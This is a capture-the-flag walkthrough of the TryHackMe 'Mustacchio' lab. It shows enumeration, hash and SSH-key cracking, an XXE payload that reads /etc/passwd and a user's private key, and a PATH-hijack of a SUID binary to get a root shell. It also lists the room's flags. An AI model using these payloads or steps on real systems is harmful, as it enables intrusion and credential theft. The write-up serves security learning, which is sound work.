## Mustacchio - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/mustacchio)

**IP: 10.10.167.181**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Gobuster, John, Burp Suite<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan and Gobuster.

  ```
  nmap -sC -sV -T5 -p- 10.10.167.181

  PORT     STATE SERVICE VERSION
  22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
  |   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
  |_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
  80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
  | http-robots.txt: 1 disallowed entry 
  |_/
  |_http-title: Mustacchio | Home
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  8765/tcp open  http    nginx 1.10.3 (Ubuntu)
  |_http-server-header: nginx/1.10.3 (Ubuntu)
  |_http-title: Mustacchio | Login
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://10.10.167.181 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /images               (Status: 301) [Size: 315] [--> http://10.10.167.181/images/]
  /custom               (Status: 301) [Size: 315] [--> http://10.10.167.181/custom/]
  /fonts                (Status: 301) [Size: 314] [--> http://10.10.167.181/fonts/]
  Progress: 87664 / 87665 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- When I visited `http://10.10.167.181`, I found `.bak` file with credentials. Cracked the hash with John and tried SSH but it's not it so I moved on.

  ```
  cat users.bak
  [SNIP!]
  SQLite
  tableusersusersCREATE TABLE users(username text NOT NULL, password text NOT NULL)
  admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

  john --wordlist=/rockyou.txt hash.txt                    
  Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
  Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
  Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
  Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
  Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
  Use the "--format=ripemd-160" option to force loading these as that type instead
  Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
  Use the "--format=has-160" option to force loading these as that type instead
  Using default input encoding: UTF-8
  Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
  Warning: no OpenMP support for this hash type, consider --fork=2
  Press 'q' or Ctrl-C to abort, almost any other key for status
  bulldog19        (?)     
  1g 0:00:00:00 DONE (2025-05-19 13:39) 20.00g/s 13682Kp/s 13682Kc/s 13682KC/s bulldog27..bullcrap1
  Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
  Session completed. 
  ```
  
- OK, since port 80 was a dead end at this moment, I moved to port 8765 and found an admin panel. Log in with credentials that we found and in source code you can find a message.

  ```
     <script type="text/javascript">
        //document.cookie = "Example=/auth/dontforget.bak"; 
        function checktarea() {
        let tbox = document.getElementById("box").value;
        if (tbox == null || tbox.length == 0) {
          alert("Insert XML Code!")
        }
    }
  </script>
  </head>
  <body>
  
      <!-- Barry, you can now SSH in using your key!-->
  ```

---

## 🌐 Web Exploitation (if applicable)

- Now comes the tricky part. I got access to `dontforget.bak` via Burp.

  ```
  Request:

  GET /auth/dontforget.bak HTTP/1.1
  Host: 10.10.167.181:8765
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 13
  Origin: http://10.10.167.181:8765
  Connection: keep-alive
  Referer: http://10.10.167.181:8765/home.php
  Cookie: PHPSESSID=rtodpf8g5e6gecq7u4humludj6
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i

  Response:

  Response:

  HTTP/1.1 200 OK
  Server: nginx/1.10.3 (Ubuntu)
  Date: Mon, 19 May 2025 12:47:37 GMT
  Content-Type: application/octet-stream
  Content-Length: 996
  Last-Modified: Sat, 12 Jun 2021 15:48:14 GMT
  Connection: keep-alive
  ETag: "60c4d73e-3e4"
  Accept-Ranges: bytes
  
  <?xml version="1.0" encoding="UTF-8"?>
  <comment>
    <name>Joe Hamd</name>
    <author>Barry Clad</author>
    <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life.
  Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely.
   You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end.
  But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
  </comment>
  ```
  
- Here I started experimenting with different types of payloads in order to find vulnerability, and I got LFI.

  ```
  Request encoded payload:

  POST /home.php HTTP/1.1
  Host: 10.10.167.181:8765
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 246
  Origin: http://10.10.167.181:8765
  Connection: keep-alive
  Referer: http://10.10.167.181:8765/home.php
  Cookie: PHPSESSID=rtodpf8g5e6gecq7u4humludj6
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  
  xml=<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>
  <!DOCTYPE+foo+[
  +++<!ELEMENT+foo+ANY+>
  +++<!ENTITY+xxe+SYSTEM++"file%3a///etc/passwd"+>]>
  <comment>
  ++<name>Joe+Hamd</name>
  ++<author>Barry+Clad</author>
  ++<com>%26xxe%3b</com>
  </comment>
  ```

  ```
  Response:

  <h3>Comment Preview:</h3>
  <p>Name: Joe Hamd</p>
  <p>Author : Barry Clad</p>
  <p>Comment :<br> 
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
  systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
  systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
  systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
  syslog:x:104:108::/home/syslog:/bin/false
  _apt:x:105:65534::/nonexistent:/bin/false
  lxd:x:106:65534::/var/lib/lxd/:/bin/false
  messagebus:x:107:111::/var/run/dbus:/bin/false
  uuidd:x:108:112::/run/uuidd:/bin/false
  dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
  sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
  pollinate:x:111:1::/var/cache/pollinate:/bin/false
  joe:x:1002:1002::/home/joe:/bin/bash
  barry:x:1003:1003::/home/barry:/bin/bash<p/>    
  </section>
  ```
  
- Perfect, since we got `/etc/passwd` with LFI, that also means we can get access to any file in the system. SSH doesn't allow password access and SSH key was already mentioned in the comment in source code of main page so let's look for it.
  We do the same payload as above, just change the directory from `/etc/passwd` to `/home/barry/.ssh/id_rsa` since we are looking for `Barry's` SSH key, that's the only username we have beside `admin`.

  ```
  POST /home.php HTTP/1.1
  Host: 10.10.167.181:8765
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 258
  Origin: http://10.10.167.181:8765
  Connection: keep-alive
  Referer: http://10.10.167.181:8765/home.php
  Cookie: PHPSESSID=rtodpf8g5e6gecq7u4humludj6
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  
  xml=<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>
  <!DOCTYPE+foo+[
  +++<!ELEMENT+foo+ANY+>
  +++<!ENTITY+xxe+SYSTEM++"file%3a///home/barry/.ssh/id_rsa"+>]>
  <comment>
  ++<name>Joe+Hamd</name>
  ++<author>Barry+Clad</author>
  ++<com>%26xxe%3b</com>
  </comment>

  -----BEGIN RSA PRIVATE KEY-----
  Proc-Type: 4,ENCRYPTED
  DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E
  
  [SNIP!]
  -----END RSA PRIVATE KEY-----
  ```

- Now we have everything we need to gain access, username `barry` and his SSH key. Save the RSA key, convert it to hash and crack it in order to get passphrase. Change key permission to 600 and then login.

  ```
  ssh2john id_rsa > barry.hash     
                                                                                                                     
  john --wordlist=/rockyou.txt barry.hash 
  Using default input encoding: UTF-8
  Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
  Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
  Cost 2 (iteration count) is 1 for all loaded hashes
  Will run 2 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  urieljames       (id_rsa)     
  1g 0:00:00:01 DONE (2025-05-19 13:53) 0.9900g/s 2941Kp/s 2941Kc/s 2941KC/s urieljr.k..urielito1000
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed. 
  
  ssh -i id_rsa barry@10.10.167.181                            
  Enter passphrase for key 'id_rsa': 
  Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

  [SNIP!]
  
  barry@mustacchio:~$ whoami
  barry
  barry@mustacchio:~$ id
  uid=1003(barry) gid=1003(barry) groups=1003(barry)
  ```

---

## 🧍 User Privilege Escalation

- First flag is already there waiting for you.

  ```
  barry@mustacchio:~$ pwd
  /home/barry
  barry@mustacchio:~$ ls -al
  total 20
  drwxr-xr-x 4 barry barry 4096 May 19 12:53 .
  drwxr-xr-x 4 root  root  4096 Jun 12  2021 ..
  drwx------ 2 barry barry 4096 May 19 12:53 .cache
  drwxr-xr-x 2 barry barry 4096 Jun 12  2021 .ssh
  -rw-r--r-- 1 barry barry   33 Jun 12  2021 user.txt
  
  barry@mustacchio:~$ cat user.txt 
  62d77a4d5f97d47c5aa38b3b2651b831
  ```
  
- Moving to privilege escalation.

---

## 👑 Root Privilege Escalation

- OK, so after some enumeration I found the way to root.

  ```
  barry@mustacchio:/$ find / -type f -perm -u=s 2>/dev/null
  /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
  /usr/lib/eject/dmcrypt-get-device
  /usr/lib/policykit-1/polkit-agent-helper-1
  /usr/lib/snapd/snap-confine
  /usr/lib/openssh/ssh-keysign
  /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /usr/bin/passwd
  /usr/bin/pkexec
  /usr/bin/chfn
  /usr/bin/newgrp
  /usr/bin/at
  /usr/bin/chsh
  /usr/bin/newgidmap
  /usr/bin/sudo
  /usr/bin/newuidmap
  /usr/bin/gpasswd
  /home/joe/live_log
  /bin/ping
  /bin/ping6
  /bin/umount
  /bin/mount
  /bin/fusermount
  /bin/su
  ```
  
- Hmmmm, that `live_log` file is very suspicious so let's check it out. It's bunch of globglub when you use `cat` on it, but `strings` is DA GOAT for this stuff.

  ```
  barry@mustacchio:/$ cd /home/joe
  barry@mustacchio:/home/joe$ ls -al
  total 28
  drwxr-xr-x 2 joe  joe   4096 Jun 12  2021 .
  drwxr-xr-x 4 root root  4096 Jun 12  2021 ..
  -rwsr-xr-x 1 root root 16832 Jun 12  2021 live_log

  barry@mustacchio:/home/joe$ strings live_log

  [SNIP!]
  []A\A]A^A_
  Live Nginx Log Reader
  tail -f /var/log/nginx/access.log
  :*3$"
  GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
  [SNIP!]
  ```
  
- Nice, it's executing `tail` command, in order to exploit it we will just create a fake `tail` file which will be our exploit, add it to path and make it executable. Let's do it!

  ```
  barry@mustacchio:/home/joe$ cd /tmp
  barry@mustacchio:/tmp$ ls -al
  total 28
  drwxrwxrwt  7 root root 4096 May 19 13:00 .
  drwxr-xr-x 24 root root 4096 May 19 12:26 ..
  drwxrwxrwt  2 root root 4096 May 19 12:25 .font-unix
  drwxrwxrwt  2 root root 4096 May 19 12:25 .ICE-unix
  drwxrwxrwt  2 root root 4096 May 19 12:25 .Test-unix
  drwxrwxrwt  2 root root 4096 May 19 12:25 .X11-unix
  drwxrwxrwt  2 root root 4096 May 19 12:25 .XIM-unix
  
  barry@mustacchio:/tmp$ nano tail

  #!/bin/bash
  cp /bin/bash /tmp/bash
  chmod +s /tmp/bash
  
  barry@mustacchio:/tmp$ ls -al
  total 32
  drwxrwxrwt  7 root  root  4096 May 19 13:04 .
  drwxr-xr-x 24 root  root  4096 May 19 12:26 ..
  drwxrwxrwt  2 root  root  4096 May 19 12:25 .font-unix
  drwxrwxrwt  2 root  root  4096 May 19 12:25 .ICE-unix
  -rw-rw-r--  1 barry barry   54 May 19 13:04 tail
  drwxrwxrwt  2 root  root  4096 May 19 12:25 .Test-unix
  drwxrwxrwt  2 root  root  4096 May 19 12:25 .X11-unix
  drwxrwxrwt  2 root  root  4096 May 19 12:25 .XIM-unix

  barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
  barry@mustacchio:/tmp$ chmod +x /tmp/tail
  ```

- That part is done, for the final blow we just have to execute that SUID `live_log` and after that execute `/tmp/bash -p` and BOOM! We are root!

  ```
  barry@mustacchio:/tmp$ cd /home/joe
  barry@mustacchio:/home/joe$ ls -al
  total 28
  drwxr-xr-x 2 joe  joe   4096 Jun 12  2021 .
  drwxr-xr-x 4 root root  4096 Jun 12  2021 ..
  -rwsr-xr-x 1 root root 16832 Jun 12  2021 live_log
  
  barry@mustacchio:/home/joe$ ./live_log 
  Live Nginx Log Readerbarry@mustacchio:/home/joe$ ls /tmp
  bash  tail
  
  barry@mustacchio:/home/joe$ /tmp/bash -p
  bash-4.3# whoami
  root
  bash-4.3# id
  uid=1003(barry) gid=1003(barry) euid=0(root) egid=0(root) groups=0(root),1003(barry)
  bash-4.3# cat /root/root.txt
  3223581420d906c4dd1a5f9b530393a5
  ```

- IMPORTANT NOTE !!! You see that before executing `live_log` there was no `bash` binary in `/tmp` directory and after executing SUID, `bash` was created in `/tmp`. That must be done this way in order for exploit to work.
  If you don't see `bash` after executing the SUID, you did something wrong. If that happens, remove fake `tail` and create new one and start all steps again from step 1.

---

## 🏁 Flags

- **User Flag**: `62d77a4d5f97d47c5aa38b3b2651b831`
- **Root Flag**: `3223581420d906c4dd1a5f9b530393a5`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Initial access was a bit tricky.`

- What did I learn?
  `New exploitation and privilege escalation.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
